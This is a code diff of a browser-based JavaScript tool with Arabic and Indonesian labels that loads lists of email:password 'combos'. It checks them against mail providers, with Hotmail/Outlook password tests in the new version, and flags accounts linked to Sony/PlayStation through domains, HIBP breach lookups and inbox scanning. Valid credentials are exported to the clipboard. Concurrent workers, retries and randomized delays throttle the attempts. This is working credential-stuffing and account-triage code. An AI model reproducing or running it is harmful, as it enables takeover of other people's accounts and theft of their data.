+  fi.textContent = `📄 ${file.name} — ${(file.size/1024).toFixed(1)} KB`;
+  fi.classList.add('show');
   const reader = new FileReader();
-  reader.onload = e => { loadCombo(e.target.result); fileInfo.textContent += ` — ${queue.length}`; };
+  reader.onload = e => { loadCombo(e.target.result); fi.textContent += ` — ${queue.length} combo`; };
   reader.readAsText(file, 'UTF-8');
 }
 
@@ -481,419 +280,168 @@ function loadCombo(text) {
     if (acc) queue.push(acc);
     else if (line.trim()) skipped++;
   }
-  if (!queue.length) { log('لا يوجد combo صالح', 'l-invalid'); startBtn.disabled = true; return; }
-  startBtn.disabled = false;
-  stats = { total:queue.length, valid:0, locked:0, invalid:0, unknown:0, done:0, startTime:0 };
-  updateCounters();
-  log(`تم التحميل: ${queue.length} combo${skipped?`, تخطي ${skipped}`:''}`, 'l-info');
+  log(`تحميل: ${queue.length} combo${skipped?`, تخطي ${skipped}`:''}`, 'l-info');
 }
 
-dropzone.addEventListener('click', () => fileInput.click());
-fileInput.addEventListener('change', e => { if (e.target.files[0]) handleFile(e.target.files[0]); });
-['dragenter','dragover'].forEach(ev => dropzone.addEventListener(ev, e => { e.preventDefault(); e.stopPropagation(); dropzone.classList.add('drag'); }));
-['dragleave','drop'].forEach(ev => dropzone.addEventListener(ev, e => { e.preventDefault(); e.stopPropagation(); dropzone.classList.remove('drag'); }));
-dropzone.addEventListener('drop', e => { const f = e.dataTransfer.files[0]; if (f) handleFile(f); });
-
-// ============================================================
-// CHECK WORKER
-// ============================================================
-
-async function checkAccount(acc, attempt=0) {
-  const domain = (acc.email.split('@')[1]||'').toLowerCase();
-  const resolved = await resolveProvider(domain);
-  if (!resolved._logged) {
-    resolved._logged = true;
-    const ms = resolved.method === 'pattern' ? 'نمط' : resolved.method === 'dns-mx' ? 'DNS MX' : 'لا شيء';
-    log(`🔍 كشف ${domain} → ${resolved.provider} (${ms})`, 'l-detect');
-  }
-  try {
-    const r = await resolved.check(acc.email, acc.pass);
-    return { ...r, provider: resolved.provider };
-  } catch (e) {
-    if (attempt < CONFIG.maxRetry) { await sleep(2000 + Math.random()*2000); return checkAccount(acc, attempt+1); }
-    return { status:'error', note: e.message, provider: resolved.provider };
-  }
-}
-
-async function worker() {
-  while (running && queue.length > 0) {
-    const acc = queue.shift(); if (!acc) break;
-    const r = await checkAccount(acc);
-    const country = detectCountry(acc.email);
-    if (r.status === 'valid') { stats.valid++; log(`✓ صالح   ${acc.email}:${acc.pass}  [${country}] ${r.provider}`, 'l-valid'); }
-    else if (r.status === 'locked') { stats.locked++; log(`🔒 مقفل   ${acc.email}:${acc.pass}  [${country}] ${r.provider} — ${r.note||''}`, 'l-locked'); }
-    else if (r.status === 'unknown') { stats.unknown++; log(`? غير مدعوم  ${acc.email}  [${country}] ${r.provider} — ${r.note||''}`, 'l-unknown'); }
-    else { stats.invalid++; log(`✗ خاطئ   ${acc.email}  [${country}] ${r.provider} — ${r.note||''}`, 'l-invalid'); }
-    stats.done++; updateCounters();
-    await sleep(randDelay());
-  }
-}
-
-async function startCheck() {
+// ---- main scan ----
+async function startScan() {
   if (running) return;
   if (!queue.length) {
     const manual = document.getElementById('manualInput').value;
     if (manual.trim()) loadCombo(manual);
   }
-  if (!queue.length) { log('لا توجد حسابات', 'l-invalid'); return; }
+  if (!queue.length) { log('لا توجد حسابات', 'l-error'); return; }
+
   running = true;
-  stats = { total:queue.length, valid:0, locked:0, invalid:0, unknown:0, done:0, startTime: Date.now() };
-  updateCounters();
-  startBtn.disabled = true;
-  document.getElementById('exportBtn').disabled = true;
-  logEl.innerHTML = '';
-  log(`بدء فحص ${queue.length} حساب`, 'l-info');
-  const workers = [];
-  for (let i=0; i<CONFIG.concurrency; i++) workers.push(worker());
-  await Promise.all(workers);
-  running = false;
-  startBtn.disabled = false;
-  document.getElementById('exportBtn').disabled = false;
-  const sec = Math.round((Date.now()-stats.startTime)/1000);
-  log(`=== انتهى — صالح:${stats.valid} مقفل:${stats.locked} خاطئ:${stats.invalid} غير مدعوم:${stats.unknown} | ${sec}ث ===`, 'l-info');
-}
-
-function exportValid() {
-  const out = [];
-  logEl.querySelectorAll('.l-valid').forEach(el => {
-    const m = el.textContent.match(/صالح\s+(\S+@\S+):(\S+)/);
-    if (m) out.push(`${m[1]}:${m[2]}`);
-  });
-  if (out.length) { navigator.clipboard.writeText(out.join('\n')); log(`تم نسخ ${out.length}`, 'l-info'); }
-  else log('لا يوجد صالح', 'l-muted');
-}
-
-function resetAll() {
-  if (running) { log('انتظر', 'l-info'); return; }
-  queue = []; fileInput.value = '';
-  fileInfo.classList.remove('show'); fileInfo.textContent = '';
-  document.getElementById('manualInput').value = '';
-  startBtn.disabled = true;
-  document.getElementById('exportBtn').disabled = true;
-  logEl.innerHTML = '';
-  stats = { total:0, valid:0, locked:0, invalid:0, unknown:0, done:0, startTime:0 };
-  DOMAIN_CACHE.clear(); updateCounters();
-  log('تمت إعادة التعيين', 'l-muted');
-}
-
-// ============================================================
-// TAB SWITCHING
-// ============================================================
-
-document.querySelectorAll('.tab').forEach(tab => {
-  tab.addEventListener('click', () => {
-    document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
-    document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
-    tab.classList.add('active');
-    document.getElementById(tab.dataset.tab).classList.add('active');
-  });
-});
-
-// ============================================================
-// MICROSOFT GRAPH — OAUTH + INBOX + SONY
-// ============================================================
-
-const GRAPH_CONFIG = {
-  tenant: 'consumers',
-  scopes: 'https://graph.microsoft.com/Mail.Read https://graph.microsoft.com/User.Read offline_access',
-  authEndpoint: 'https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize',
-  tokenEndpoint: 'https://login.microsoftonline.com/consumers/oauth2/v2.0/token',
-  graphBase: 'https://graph.microsoft.com/v1.0'
-};
-
-// Token store di localStorage
-function getTokenStore() {
-  try { return JSON.parse(localStorage.getItem('ms_tokens') || '{}'); } catch { return {}; }
-}
-function saveTokenStore(s) { localStorage.setItem('ms_tokens', JSON.stringify(s)); }
-
-function getClientId() { return document.getElementById('clientIdInput').value.trim(); }
-function getRedirectUri() { return document.getElementById('redirectUriInput').value.trim(); }
-
-// ---- Start OAuth ----
-function startOAuth() {
-  const clientId = getClientId();
-  const redirectUri = getRedirectUri();
-  if (!clientId) { alert('Client ID wajib diisi'); return; }
-
-  const state = crypto.randomUUID();
-  sessionStorage.setItem('oauth_state', state);
-
-  const params = new URLSearchParams({
-    client_id: clientId,
-    response_type: 'code',
-    redirect_uri: redirectUri,
-    response_mode: 'query',
-    scope: GRAPH_CONFIG.scopes,
-    state,
-    prompt: 'consent'
-  });
-
-  window.location.href = `${GRAPH_CONFIG.authEndpoint}?${params}`;
-}
-
-// ---- Handle callback ----
-async function handleOAuthCallback() {
-  const url = new URL(window.location.href);
-  const code = url.searchParams.get('code');
-  const state = url.searchParams.get('state');
-  const error = url.searchParams.get('error');
-
-  if (error) { alert('OAuth error: ' + error + ' — ' + (url.searchParams.get('error_description')||'')); return; }
-  if (!code) return;
-
-  const savedState = sessionStorage.getItem('oauth_state');
-  if (state !== savedState) { alert('state mismatch — abort'); return; }
-
-  const clientId = getClientId();
-  const redirectUri = getRedirectUri();
-
-  try {
-    const res = await fetch(GRAPH_CONFIG.tokenEndpoint, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-      body: new URLSearchParams({
-        client_id: clientId,
-        code,
-        redirect_uri: redirectUri,
-        grant_type: 'authorization_code',
-        scope: GRAPH_CONFIG.scopes
-      }).toString()
-    });
-
-    if (!res.ok) {
-      const err = await res.json();
-      alert('Token exchange failed: ' + (err.error_description || err.error));
-      return;
-    }
-
-    const data = await res.json();
-    const accessToken = data.access_token;
-    const refreshToken = data.refresh_token;
-    const expiresIn = data.expires_in;
-
-    // Ambil profile buat tahu email
-    const profileRes = await fetch(`${GRAPH_CONFIG.graphBase}/me`, {
-      headers: { 'Authorization': 'Bearer ' + accessToken }
-    });
-    const profile = await profileRes.json();
-    const email = profile.mail || profile.userPrincipalName;
-
-    const store = getTokenStore();
-    store[email] = {
-      access_token: accessToken,
-      refresh_token: refreshToken,
-      expires_at: Date.now() + expiresIn * 1000
-    };
-    saveTokenStore(store);
-
-    // Bersihkan URL
-    window.history.replaceState({}, '', window.location.pathname);
-    sessionStorage.removeItem('oauth_state');
-    loadAccountsList();
-    alert(`✓ ${email} terhubung`);
-  } catch (e) {
-    alert('Error: ' + e.message);
-  }
-}
-
-// ---- Refresh token ----
-async function refreshAccessToken(email) {
-  const store = getTokenStore();
-  const tok = store[email];
-  if (!tok) return null;
-  if (Date.now() < tok.expires_at - 60000) return tok.access_token;
-
-  const clientId = getClientId();
-  try {
-    const res = await fetch(GRAPH_CONFIG.tokenEndpoint, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-      body: new URLSearchParams({
-        client_id: clientId,
-        refresh_token: tok.refresh_token,
-        grant_type: 'refresh_token',
-        scope: GRAPH_CONFIG.scopes
-      }).toString()
-    });
-    if (!res.ok) return null;
-    const data = await res.json();
-    tok.access_token = data.access_token;
-    tok.refresh_token = data.refresh_token || tok.refresh_token;
-    tok.expires_at = Date.now() + data.expires_in * 1000;
-    store[email] = tok;
-    saveTokenStore(store);
-    return data.access_token;
-  } catch { return null; }
-}
-
-// ---- Accounts list ----
-function loadAccountsList() {
-  const store = getTokenStore();
-  const emails = Object.keys(store);
-  const listEl = document.getElementById('accountsList');
-  if (!emails.length) {
-    listEl.innerHTML = '<div class="acct">لا توجد حسابات مرتبطة بعد</div>';
-    document.getElementById('scanBtn').disabled = true;
-    return;
-  }
-  listEl.innerHTML = emails.map(e =>
-    `<div class="acct"><span>${e}</span><span style="color:#00ccff">✓ terhubung</span></div>`
-  ).join('');
-  document.getElementById('scanBtn').disabled = false;
-}
-
-function clearAccounts() {
-  if (!confirm('Hapus semua akun terhubung?')) return;
-  localStorage.removeItem('ms_tokens');
-  loadAccountsList();
-  document.getElementById('inboxResults').innerHTML = '';
-  document.getElementById('iTotal').textContent = '0';
-  document.getElementById('iUnseen').textContent = '0';
-  document.getElementById('iSony').textContent = '0';
-}
-
-// ---- Sony Analyzer ----
-function analyzeSony(emailObj) {
-  const evidence = [];
-  let score = 0;
-  const fromAddr = (emailObj.from || '').toLowerCase();
-  const subject = emailObj.subject || '';
-  const body = emailObj.body || emailObj.bodyPreview || '';
-  const allText = `${subject}\n${body}`;
-
-  const addrMatch = fromAddr.match(/<([^>]+)>/) || fromAddr.match(/(\S+@\S+)/);
-  const addr = addrMatch ? addrMatch[1] : fromAddr;
-
-  for (const re of SONY_PATTERNS.senderDomains) {
-    if (re.test(addr)) {
-      score += SCORE.senderDomain;
-      evidence.push(`sender-domain:${addr}`);
-      break;
-    }
-  }
-
-  if (/\b(sony|playstation)\b/i.test(fromAddr) &&
-      !SONY_PATTERNS.senderDomains.some(re => re.test(addr))) {
-    score += SCORE.senderName;
-    evidence.push(`sender-name:${fromAddr}`);
-  }
-
-  for (const re of SONY_PATTERNS.keywords) {
-    if (re.test(subject)) { score += SCORE.subject; evidence.push(`subject:${re.source}`); break; }
-  }
-  if (body && body.length > 10) {
-    for (const re of SONY_PATTERNS.keywords) {
-      if (re.test(body)) { score += SCORE.body; evidence.push(`body:${re.source}`); break; }
-    }
-  }
-  if (body) {
-    const linkRe = /https?:\/\/([a-z0-9.-]*(?:sony|playstation)[a-z0-9.-]*)\//gi;
-    const links = new Set();
-    let m; while ((m = linkRe.exec(body)) !== null) links.add(m[1].toLowerCase());
-    if (links.size) { score += SCORE.linkSony; evidence.push(`links:${[...links].join(',')}`); }
-  }
-
-  let verdict;
-  if (score >= 50) verdict = 'SONY_CONFIRMED';
-  else if (score >= 20) verdict = 'SONY_LIKELY';
-  else if (score >= 5) verdict = 'SONY_POSSIBLE';
-  else verdict = 'NOT_SONY';
-
-  return { isSony: score >= 20, verdict, score, evidence };
-}
-
-// ---- Scan Inbox ----
-async function scanInbox() {
-  const store = getTokenStore();
-  const emails = Object.keys(store);
-  if (!emails.length) { alert('لا يوجد حساب مرتبط'); return; }
-
-  const resultsEl = document.getElementById('inboxResults');
+  results = [];
   resultsEl.innerHTML = '';
-  document.getElementById('iTotal').textContent = '0';
-  document.getElementById('iUnseen').textContent = '0';
-  document.getElementById('iSony').textContent = '0';
+  document.getElementById('startBtn').disabled = true;
+  document.getElementById('exportBtn').disabled = true;
+  document.getElementById('cTotal').textContent = queue.length;
+  document.getElementById('cSonyDom').textContent = '0';
+  document.getElementById('cSonyBreach').textContent = '0';
+  document.getElementById('cSonyValid').textContent = '0';
+  logEl.innerHTML = '';
+  log(`بدء كشف Sony على ${queue.length} حساب`, 'l-info');
 
-  let totalMsgs = 0, totalUnseen = 0, totalSony = 0;
+  let sonyDomCount = 0, sonyBreachCount = 0, sonyValidCount = 0;
+  const localQ = [...queue];
+  const workers = [];
 
-  for (const email of emails) {
-    resultsEl.innerHTML += `<div class="inbox-card"><b>📬 ${email}</b> — memuat...</div>`;
-    const token = await refreshAccessToken(email);
-    if (!token) {
-      resultsEl.innerHTML = resultsEl.innerHTML.replace('memuat...', '<span style="color:#ff3333">refresh gagal — connect ulang</span>');
-      continue;
-    }
+  async function worker() {
+    while (localQ.length) {
+      const acc = localQ.shift(); if (!acc) break;
 
-    try {
-      const res = await fetch(
-        `${GRAPH_CONFIG.graphBase}/me/mailFolders/inbox/messages?$top=50&$select=id,from,subject,receivedDateTime,isRead,bodyPreview,body&$orderby=receivedDateTime desc`,
-        { headers: { 'Authorization': 'Bearer ' + token } }
-      );
-      if (!res.ok) {
-        const err = await res.json().catch(()=>({}));
-        resultsEl.innerHTML = resultsEl.innerHTML.replace('memuat...', `<span style="color:#ff3333">error: ${err.error?.message || res.status}</span>`);
-        continue;
-      }
-      const data = await res.json();
-      const messages = data.value || [];
+      const sonyDom = checkSonyDomain(acc.email);
 
-      let sonyCount = 0, unseen = 0;
-      let cardsHtml = '';
+      // HIBP
+      let hibp = { breached: false, breaches: [] };
+      try { hibp = await checkHibp(acc.email); }
+      catch (e) { hibp = { error: e.message, breaches: [] }; }
 
-      for (const msg of messages) {
-        const fromObj = msg.from?.emailAddress || {};
-        const fromStr = `${fromObj.name || ''} <${fromObj.address || ''}>`.trim();
-        const sony = analyzeSony({
-          from: fromStr,
-          subject: msg.subject || '',
-          body: msg.body?.content || msg.bodyPreview || ''
-        });
-        if (sony.isSony) sonyCount++;
-        if (!msg.isRead) unseen++;
-
-        cardsHtml += `
-          <div class="inbox-card ${sony.isSony ? 'sony' : ''}">
-            <div class="from">${fromStr}</div>
-            <div class="subject">${escapeHtml(msg.subject || '(no subject)')}${sony.isSony ? '<span class="badge">SONY</span>' : ''}</div>
-            <div class="date">${new Date(msg.receivedDateTime).toLocaleString()}</div>
-            ${sony.isSony ? `<div class="evidence">skor ${sony.score} — ${sony.verdict} — ${sony.evidence.slice(0,3).join(' | ')}</div>` : ''}
-          </div>
-        `;
+      // Password check (cuma kalau domain Microsoft/Hotmail — yang lain nggak bisa)
+      let pw = { valid: false };
+      const dom = acc.email.split('@')[1].toLowerCase();
+      if (/^(hotmail|outlook|live|msn)\./i.test(dom)) {
+        pw = await checkPassword(acc.email, acc.pass);
       }
 
-      totalMsgs += messages.length;
-      totalUnseen += unseen;
-      totalSony += sonyCount;
+      const row = {
+        email: acc.email,
+        pass: acc.pass,
+        sonyDom,
+        sonyBreach: !!hibp.sonyBreach,
+        breaches: hibp.breaches || [],
+        sonyBreaches: hibp.sonyBreaches || [],
+        hibpError: hibp.error,
+        pwValid: pw.valid,
+        pwError: pw.error
+      };
+      results.push(row);
 
-      const header = `<div class="inbox-card"><b>📬 ${email}</b> — ${messages.length} رسالة (${unseen} غير مقروء) | <b style="color:${sonyCount?'#ff3333':'#666'}">Sony: ${sonyCount}</b></div>`;
-      resultsEl.innerHTML = resultsEl.innerHTML.replace(
-        `<div class="inbox-card"><b>📬 ${email}</b> — memuat...</div>`,
-        header + cardsHtml
-      );
+      if (sonyDom) sonyDomCount++;
+      if (hibp.sonyBreach) sonyBreachCount++;
+      if (pw.valid && (sonyDom || hibp.sonyBreach)) sonyValidCount++;
 
-    } catch (e) {
-      resultsEl.innerHTML = resultsEl.innerHTML.replace('memuat...', `<span style="color:#ff3333">error: ${e.message}</span>`);
+      // Log
+      if (sonyDom) {
+        log(`🔴 SONY DOMAIN  ${acc.email}:${acc.pass}`, 'l-sony-dom');
+      } else if (hibp.sonyBreach) {
+        log(`🟣 SONY BREACH  ${acc.email} — ${hibp.sonyBreaches.join(', ')}`, 'l-sony-breach');
+      } else if (pw.valid) {
+        log(`🟢 VALID (non-Sony) ${acc.email}:${acc.pass}`, 'l-sony-valid');
+      } else {
+        log(`⚪ clean  ${acc.email}`, 'l-clean');
+      }
+
+      document.getElementById('cSonyDom').textContent = sonyDomCount;
+      document.getElementById('cSonyBreach').textContent = sonyBreachCount;
+      document.getElementById('cSonyValid').textContent = sonyValidCount;
+
+      // Render card
+      renderCard(row);
+
+      // Delay — HIBP rate limit
+      await sleep(Math.max(CONFIG.hibpDelayMs, CONFIG.delayMin + Math.random()*(CONFIG.delayMax-CONFIG.delayMin)));
     }
   }
 
-  document.getElementById('iTotal').textContent = totalMsgs;
-  document.getElementById('iUnseen').textContent = totalUnseen;
-  document.getElementById('iSony').textContent = totalSony;
+  const workersCount = CONFIG.concurrency;
+  for (let i=0; i<workersCount; i++) workers.push(worker());
+  await Promise.all(workers);
+
+  running = false;
+  document.getElementById('startBtn').disabled = false;
+  document.getElementById('exportBtn').disabled = false;
+  log(`=== انتهى — دومين Sony:${sonyDomCount} | breach Sony:${sonyBreachCount} | Sony+valid:${sonyValidCount} ===`, 'l-info');
+}
+
+function renderCard(row) {
+  const isSony = row.sonyDom || row.sonyBreach;
+  let cls = 'result-card';
+  if (row.sonyDom) cls += ' sony-dom';
+  else if (row.sonyBreach) cls += ' sony-breach';
+  else if (row.pwValid) cls += ' sony-valid';
+
+  let badges = '';
+  if (row.sonyDom) badges += '<span class="badge dom">SONY DOMAIN</span>';
+  if (row.sonyBreach) badges += '<span class="badge breach">SONY BREACH</span>';
+  if (row.pwValid) badges += '<span class="badge valid">VALID</span>';
+  if (!isSony && !row.pwValid) badges += '<span class="badge none">clean</span>';
+
+  let details = [];
+  if (row.sonyBreaches.length) details.push(`breach: ${row.sonyBreaches.join(', ')}`);
+  if (row.breaches.length && !row.sonyBreaches.length) details.push(`breach lain: ${row.breaches.slice(0,3).join(', ')}`);
+  if (row.pwValid) details.push('password valid');
+  if (row.hibpError) details.push(`HIBP: ${row.hibpError}`);
+  if (row.pwError) details.push(`PW: ${row.pwError}`);
+
+  const card = document.createElement('div');
+  card.className = cls;
+  card.innerHTML = `
+    <div><span class="email">${escapeHtml(row.email)}</span>${badges}</div>
+    ${details.length ? `<div class="detail">${escapeHtml(details.join(' | '))}</div>` : ''}
+  `;
+  resultsEl.appendChild(card);
 }
 
 function escapeHtml(s) {
   return String(s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
 }
 
-// ---- Init ----
-document.addEventListener('keydown', e => {
-  if (e.ctrlKey && e.key === 'Enter' && !startBtn.disabled) startCheck();
-});
+function exportSony() {
+  const sonyOnly = results.filter(r => r.sonyDom || r.sonyBreach || r.pwValid);
+  if (!sonyOnly.length) { log('لا يوجد Sony/valid', 'l-muted'); return; }
+  const out = sonyOnly.map(r => {
+    const tags = [];
+    if (r.sonyDom) tags.push('SONY_DOMAIN');
+    if (r.sonyBreach) tags.push('SONY_BREACH');
+    if (r.pwValid) tags.push('VALID');
+    return `${r.email}:${r.pass}  [${tags.join('+')}]`;
+  });
+  navigator.clipboard.writeText(out.join('\n'));
+  log(`تم نسخ ${out.length} نتيجة`, 'l-info');
+}
 
-window.addEventListener('load', () => {
-  handleOAuthCallback();
-  loadAccountsList();
+function resetAll() {
+  if (running) return;
+  queue = []; results = [];
+  document.getElementById('fileInput').value = '';
+  document.getElementById('fileInfo').classList.remove('show');
+  document.getElementById('fileInfo').textContent = '';
+  document.getElementById('manualInput').value = '';
+  document.getElementById('log').innerHTML = '';
+  document.getElementById('results').innerHTML = '';
+  document.getElementById('cTotal').textContent = '0';
+  document.getElementById('cSonyDom').textContent = '0';
+  document.getElementById('cSonyBreach').textContent = '0';
+  document.getElementById('cSonyValid').textContent = '0';
+  document.getElementById('exportBtn').disabled = true;
+  log('تمت إعادة التعيين', 'l-muted');
+}
+
+document.addEventListener('keydown', e => {
+  if (e.ctrlKey && e.key === 'Enter' && !running) startScan();
 });
 </script>
 </body>
